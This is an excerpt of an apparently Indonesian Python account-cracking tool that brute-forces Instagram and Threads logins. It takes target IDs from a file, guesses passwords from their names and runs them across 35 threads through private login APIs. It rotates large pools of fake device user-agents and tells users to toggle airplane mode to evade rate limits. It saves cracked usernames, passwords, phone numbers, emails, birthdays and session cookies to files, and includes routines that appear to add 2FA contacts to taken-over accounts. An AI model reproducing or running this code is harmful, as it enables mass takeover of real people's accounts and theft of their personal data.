...
class MAIN:
 ...
 11. Cari Akun Verif Email   12. Crack Akun Facebook
 13. Crack Dari File''',True)  # Tambahan opsi 13
       self.chs(self.aset)
...
\n\tSalin Text Di Atas Untuk Mempercepat!'))
         ...
         elif x in ['13']:self.crack_from_file(assets)  # Tambahan logika untuk opsi 13

   def crack_from_file(self, assets):
       """
       Logika untuk crack dari file.
       Membaca ID pengguna dari file yang disediakan dan memprosesnya sama seperti opsi 1.
       """
       try:
           # Meminta path file
           file_path = input(f'{P}Masukan path file (contoh: data/target.txt): {P}')
           ...
           if len(user_ids) == 0:
               print(f'{M}File kosong!{P}')
               return

           print(f'{H}Memproses {len(user_ids)} target dari file...{P}')

           # Menampilkan metode crack seperti opsi lain
           self.List(user_ids)

       except Exception as e:
           print(f'{M}Terjadi kesalahan: {e}{P}')

   def List(self, uid):
       """
       Menampilkan pilihan metode cracking.
       """
...
[white]01. Api Private Threads     03. Api Private Type Recovery\
 02. Api Private Type Manual 04. Api Private Type SmartLock',True)
   ...
   def Main(self):
       """
       Memproses pilihan metode cracking.
       """
       while True:
   ...
   def Exekusy(self):
       """
       Proses cracking berdasarkan metode yang dipilih.
       """
       self.MyRic('\
...
- Mainkan Mode Pesawat Jika Proses Cepat 400 ID Slow 200 -')
       with ThreadPoolExecutor(max_workers=35) as exe:
          for data in self.id:
              try:
                  idf, nama = data.split('|')
                  pw = self.pwdc(nama, idf, self.MethodType[0])  # Menggunakan metode yang dipilih
                  exe.submit(self.ApiThreads, idf, pw) if '1' in self.MethodType else \
                      exe.submit(self.Api, idf, pw) if '2' in self.MethodType else \
                      exe.submit(self.ApiRecovery, idf, pw) if '3' in self.MethodType else \
...
- Mainkan Mode Pesawat Jika Proses Cepat 400 ID Slow 200 -')
   ...
   def AppUac(self, GoblokLu=None):
        ...
        self.mt_qcom = str(random.choice(["qcom","mt6769", "mt6768","mt6767","mt6765","mt6763","mt6757","mt6755","mt6753","mt6739","mt6737","mt6735","mt6595","mt6582","mt6572", "mt6571","mt6570","mt8563","mt8167","mt8163", "mt8135","mt8127","mt8125","mt7623","mt6797","mt6592","mt6590","mt6580","mt6573","mt6575","mt6260","mt6236"]))
        ...
        self.huawei_models = ["RNE-L21", "PCT-L29", "VNS-L31", "ANE-LX1", "JMM-L22", "CLT-L29", "PRA-LX1", "SNE-LX1", "LUA-L21", "RKL-L22","LYA-L29", "CUN-L21", "STK-L21", "VIE-L29", "P10-L10","NXT-L29", "NEM-L51", "RRA-LX1", "BND-L21", "LON-L29","TAS-L21", "EML-L29", "LON-L19", "PRA-LX3", "VIE-L09","HMA-L29", "ELLA-L29", "FIG-LX1", "DUB-LX1", "CLT-L09","CUN-L03", "HUAWEI-MATE-20", "EVR-L29", "JAR-LX1", "TAR-L21","LYA-L21", "ALP-L09", "DRA-LX9", "TAR-L22", "ANA-LX1","MRX-AL09", "VNS-L52", "VIE-L29", "LUA-L29", "VIE-L09"]
        self.fujitsu = ['FCNT', 'FCG01', 'F-51B', 'F51B']
        ...
        self.scale = random.choice(["2.00", "3.00", "2.61", "2.75", "2.50", "1.80", "3.20", "2.40", "2.10", "3.50", "1.90", "2.30", "2.90", "1.70", "3.10", "2.20", "2.60", "2.80", "1.85", "2.45", "3.30", "1.95", "2.55", "2.65", "3.40", "2.95", "3.60", "1.75", "2.50", "3.00", "3.80", "2.15", "1.65", "3.20"])
        self.gamut = random.choice(["display", "P3", "wide", "display", "P3", "wide", "sRGB", "Rec. 2020", "Adobe RGB", "DCI-P3", "display-p3", "film", "RGB", "HDR", "colour", "color", "NTSC", "XYZ", "Rec. 709", "ITU-R BT.2020", "BT.2100", "DCI-P3 100%", "P3 Wide", "HDR10", "HLG","Wide Color Gamut", "Full RGB", "Wide Gamut RGB", "AdobeRGB 1998", "ITU BT.709", "Rec. 709", "Vivid", "Natural", "Custom", "Standard", "Enhanced", "High Dynamic Range", "HGI", "D65", "D75", "P3-D65", "EMOLED", "Super AMOLED", "OLED", "Amoled", "Brilliant", "ColorGamut", "HDR+"])
        self.motorola = random.choice(['MOT-A6020l37', 'MotoA953', 'XT603', 'XT682', 'MB865', 'MB865', 'MB860', 'MB860', 'MB860', 'MB860', 'MB860', 'MB860', 'Motorola Defy', 'XT320', 'MOT-XT320', 'XT557', 'XT556', 'XT555C', 'Droid', 'Momodesign MD Droid', 'Droid', 'DROID2', 'DROID2 GLOBAL', 'DROID2 GLOBAL', 'DROID2 GLOBAL', 'DROID3', 'XT894', 'DROID4', 'DROID4', 'DROID4 4G', 'Droid4X-WIN', 'Droid4X-WIN', 'DROID BIONIC', 'DROID BIONIC', 'DROID BIONIC 4G', 'DroidBox', 'XT1565', 'XT1030', 'XT1030', 'DroidPC Dual Core', 'DROID Pro', 'XT610', 'XT910', 'DROID RAZR', 'MOT-XT910S', 'XT910', 'DROID RAZR', 'XT910', 'MOT-XT910', 'DROID RAZR HD', 'XT910', 'DROID RAZR 4G', 'XT918', 'XT916', 'XT914', 'XT915', 'XT916', 'XT920', 'XT919', 'XT919', 'XT920', 'DROID RAZR HD', 'XT925', 'DROID RAZR HD', 'XT926', 'XT890', 'XT890', 'XT890', 'XT890', 'XT907', 'XT907', 'XT905', 'XT907', 'XT907', 'XT912', 'XT886', 'XT885', 'DROID RJ', 'XT1254', 'XT1254', 'XT1585', 'XT1080', 'XT1080', 'XT1080', 'Droid V3.0', 'DROIDX', 'DROIDX', 'DROIDX', 'DROIDX', 'DROIDX', 'DROID X2', 'DROID X2', 'Motorola E7 POWER', 'motorola edge', 'Motorola Edge S', 'motorola edge (2021)', 'motorola edge (2022', 'motorola edge (2022)', 'motorola edge 20', 'XT2153-1', 'motorola edge 20 pro', 'motorola edge 20 pro', 'motorola edge 30', 'motorola edge 30 neo', 'motorola edge 30 pro', 'motorola edge 40', 'motorola edge 40 pro', 'motorola edge plus', 'motorola edge plus', 'XT2125-4', 'xt2125-4', 'XT2175-2', 'XT2175-2', 'XT2201-2', 'XT2201-2', 'XT2201-2', 'XT881', 'XT901'])
        return(random.choice([
    f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; google; Pixel 6; Tensor; 420; s5e8835; {self.locale}; {self.kode})",
    f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; samsung; SM-A356B; a35x; s5e8835; {self.locale}; {self.kode})",
    f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; xiaomi; Redmi Note 10; Snapdragon 678; 480; s6e8835; {self.locale}; {self.kode})",
    f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; huawei; P40 Pro; Kirin 990; 460; s8e8835; {self.locale}; {self.kode})",
    f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; oneplus; 9 Pro; Snapdragon 888; 450; s6e8835; {self.locale}; {self.kode})",
    f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; asus; Zenfone 8; Snapdragon 888; 490; s2e8835; {self.locale}; {self.kode})",
    f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; sony; Xperia 1 II; Snapdragon 865; 430; s5e8835; {self.locale}; {self.kode})",
    f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; lg; Velvet; Snapdragon 765G; 420; s5e8835; {self.locale}; {self.kode})",
    f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; nokia; 8.3 5G; Snapdragon 765G; 400; s7e8835; {self.locale}; {self.kode})",
    f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; lenovo; Legion Phone Duel; Snapdragon 865+; 490; s5e8835; {self.locale}; {self.kode})",
    f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; zte; Axon 20 5G; Snapdragon 765G; 440; s6e8835; {self.locale}; {self.kode})",
    f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; tcl; 10 Pro; Snapdragon 675; 460; s5e8835; {self.locale}; {self.kode})",
    f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; blackberry; KEY2 LE; Snapdragon 636; 420; s3e8835; {self.locale}; {self.kode})",
    f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; sharp; Aquos R3; Snapdragon 855; 430; s4e8835; {self.locale}; {self.kode})",
    f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; essential; Phone; Snapdragon 835; 460; s6e8835; {self.locale}; {self.kode})",
    f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; vivo; X60 Pro; Exynos 1080; 480; s5e8835; {self.locale}; {self.kode})",
    f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; honor; 20 Pro; Kirin 980; 480; s7e8835; {self.locale}; {self.kode})",
    f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; infinix; Zero 8; MediaTek Helio G90T; 440; s4e8835; {self.locale}; {self.kode})",
    f"Barcelona {self.versi_istagram} (iPhone{self.iphn}; {self.ios}; in_ID; in_ID; scale={self.scale}; gamut={self.gamut}; {self.pxl}; {self.kode})"
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; fujitsu; {str(random.choice(self.fujitsu))}; {str(random.choice(self.fujitsu))}; {str(random.choice(self.fujitsu))}; {self.mt_qcom}; {self.locale}; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; motorola; {self.motorola}; qcom; in_ID; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; ASUS MOBILITY LIMITED/asus; {str(random.choice(self.asus))}; {str(random.choice(self.asus))}; qcom; id_ID; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; OPPO MOBILITY LIMITED/oppo; {str(random.choice(self.oppo2))}; {str(random.choice(self.oppo))}; {self.mt_qcom}; id_ID; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; MICROMAX MOBILITY LIMITED/micromax; {str(random.choice(self.micromax))}; {str(random.choice(self.micromax))}; {self.mt_qcom}; in_ID; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; ONEPLUS MOBILITY LIMITED/oneplus; {str(random.choice(self.oneplus))}; {str(random.choice(self.oneplus))}; {self.mt_qcom}; in_ID; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; VIVO MOBILITY LIMITED/vivo; {str(random.choice(self.vivo2))}; {str(random.choice(self.vivo))}; {self.mt_qcom}; in_ID; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; HUAWEI MOBILITY LIMITED/huawei; {str(random.choice(self.huawei_models))}; {str(random.choice(self.huawei_models))}; {self.mt_qcom}; in_ID; {self.kode})',
       #       f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; asus; {str(random.choice(self.asus))}; {str(random.choice(self.asus))}; qcom; in_ID; {self.kode})',
              #f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; huawei; {str(random.choice(self.huawei_models))}; qcom; in_ID; {self.kode})',
              ...
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; samsung; SM-A356B; a35x; s5e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; xiaomi; Redmi Note 10; Snapdragon 678; 480; s6e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; oppo; Reno5; MediaTek Dimensity 800U; 410; s4e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; huawei; P40 Pro; Kirin 990; 460; s8e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; google; Pixel 6; Tensor; 420; s5e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; realme; Realme 8 Pro; Snapdragon 720G; 480; s7e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; vivo; V21; Dimensity 800U; 450; s3e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; asus; Zenfone 8; Snapdragon 888; 490; s2e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; motorola; Edge 20; Snapdragon 870; 480; s6e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; sony; Xperia 1 II; Snapdragon 865; 430; s5e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; oneplus; 9 Pro; Snapdragon 888; 450; s6e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; lg; Velvet; Snapdragon 765G; 420; s5e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; nokia; 8.3 5G; Snapdragon 765G; 400; s7e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; realme; X50 Pro; Snapdragon 865; 480; s4e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; lenovo; Legion Phone Duel; Snapdragon 865+; 490; s5e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; zte; Axon 20 5G; Snapdragon 765G; 440; s6e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; meizu; 17 Pro; Snapdragon 865; 470; s7e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; tcl; 10 Pro; Snapdragon 675; 460; s5e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; blackberry; KEY2 LE; Snapdragon 636; 420; s3e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; sharp; Aquos R3; Snapdragon 855; 430; s4e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; essential; Phone; Snapdragon 835; 460; s6e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; realme; Narzo 30 Pro; MediaTek Dimensity 800U; 470; s7e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; vivo; X60 Pro; Exynos 1080; 480; s5e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; infinix; Zero 8; MediaTek Helio G90T; 440; s4e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; realme; 7 Pro; Snapdragon 720G; 460; s6e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; honor; 20 Pro; Kirin 980; 480; s7e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; asus; ROG Phone 5; Snapdragon 888; 490; s5e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; samsung; Galaxy Note 20 Ultra; Exynos 990; 430; s6e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; xiaomi; Mi 11; Snapdragon 888; 450; s5e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; oneplus; 8T; Snapdragon 865; 460; s4e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; vivo; NEX 3S; Snapdragon 865; 480; s7e8835; {self.locale}; {self.kode})",
              f"Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; realme; C15; MediaTek Helio G35; 450; s6e8835; {self.locale}; {self.kode})"
          ...
          #    f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; poco; {str(random.choice(self.poco))}; {str(random.choice(self.poco))}; qcom; in_ID; {self.kode})',
              f"Barcelona {self.versi_istagram} (iPhone{self.iphn}; {self.ios}; in_ID; in_ID; scale={self.scale}; gamut={self.gamut}; {self.pxl}; {self.kode})", 
           #   f"Instagram {self.versi_istagram} (iPhone{self.iphn}; {self.ios}; in_ID; in_ID; scale={self.scale}; gamut={self.gamut}; {self.pxl}; {self.kode})" 
       ]))
 ...
 {P}data profile : {K2}{followers}/{following}/{postingan}                                  ''')
   ...
   def ApiThreads(self, users, password):
       ...
       try:
           for pwb in password:
               dikaa = self.AppUac(self.HeadersApiLogin()['x-bloks-version-id'])
...
║ Pemulihan     : {self.pem}
║ Profile Data  : {info_followers}/{info_following}
║ Facebook Acc  : {akunfb}
║ Useragent     : {dikaa}
║ Cookie        : {cookie}
╚══════════════════════════════════════════════════════╝
                       ...
                       print(f'''\r                                               
{H}╔══════════════════════════════════════════════════════╗
║ Status       : {H}Success Login                      
║ Methode      : {H}Threads                             
║ Username     : {H}{info_username}                    
║ Password     : {H}{pwb}                               
║ Nomor Hp     : {H}{info_nomor_hp}                    
║ Email        : {H}{info_email}                       
║ Birthday     : {H}{info_birthday}                    
║ Facebook Acc : {akunfb}                               
║ Profile Data : {H}{info_followers}/{info_following}   
║ Useragent    : {H}{dikaa}                           
║ Cookie       : {H}{cookie}                          
╚══════════════════════════════════════════════════════╝
                                                   ''')
                       ...
                       self.pem = None
                       self.PWX = pwb
                    open('data/OK-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{info_username}|{self.PWX}|{info_followers}|{info_following}|{akunfb}|{self.aut}|{self.pem}|{cookie}\n')
                    self.ResultSuccess +=1
                    break
                    ...
                    print(f'''\r                                                        
{K2}╔══════════════════════════════════════════════════════╗
║ Status       : {K2}Checkpoint                         
║ Methode      : {K2}Threads
║ Username     : {K2}{users}
║ Password     : {K2}{pwb}                              
║ Data Profile : {K2}{followers}/{following}/{postingan}
║ Useragent    : {K2}{dikaa}
╚══════════════════════════════════════════════════════╝
                                             ''')
                    open('data/CP-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{users}|{pwb}|{followers}/{following}/{postingan}\n')
 ...
 {P}data profile : {K2}{followers}/{following}/{postingan}                             ''')
   ...
   def TahapPertama2f(self, cokie, url = 'https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point'):
       try:
           ...
           head.update({
               ...
               'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 250.0.0.25.116 (iPhone13,4; iOS 16_0; en_US; en-US; scale=3.00; 1170x2532; 123456789) NW/3',
   ...
   def AktifkanA2f(self, cokie, code, resp, auth):
       try:
           xxx, ua = resp, 'Instagram 161.0.0.45.122 Android (27/10; 400dpi; 1080x2340; Huawei/huawei; P30 Pro; ELE-L29; kirin980; en_US; 23454321)'
           head = self.headers_graph(resp)
           head.update({
              'Host': 'accountscenter.instagram.com',
              'x-ig-app-id': '1217981644879628',
       ...
       if len(sys.argv) == 2:
          if sys.argv[1].split('=')[1] == 'True':
             if os.path.isfile('data/FB-login.txt') is False:
                self.ok = True
                while self.ok:
                    self.ok = self.GettingakCode(input('FBcookie: '))
